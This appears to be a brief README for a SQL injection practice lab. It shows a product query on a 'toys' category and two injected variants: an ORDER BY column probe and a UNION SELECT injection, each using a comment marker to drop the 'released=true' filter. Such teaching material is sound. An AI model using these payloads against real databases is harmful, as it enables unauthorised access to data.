### SQLi test lab

Example sql query to reproduce
```
select product_name, price from products where category='toys' AND released=true
```

Example injected query
```
select product_name, price from products where category='toys' ORDER BY 1,2  --' AND released=true
select product_name, price from products where category='toys' UNION select 'inject', null --' AND released=true  
``` 
